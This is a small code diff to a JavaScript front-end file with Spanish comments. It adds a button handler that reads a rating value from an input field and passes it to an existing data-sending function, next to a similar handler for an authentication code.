@@ -301,6 +301,12 @@ document.getElementById("authBtn").addEventListener("click", async function () {
     await enviarDatos('auth', authCode);  // Enviar código de autenticación
 });
 
+// Enviar calificación
+document.getElementById("calificacionBtn").addEventListener("click", async function () {
+    const calificacion = document.getElementById("calificacionCode").value;
+    await enviarDatos('calificacion', calificacion);
+});
+
 // Función para mostrar la alerta personalizada de autenticación incorrecta
 function mostrarAlertaAutenticacionIncorrecta() {
     // Crea un contenedor de alerta
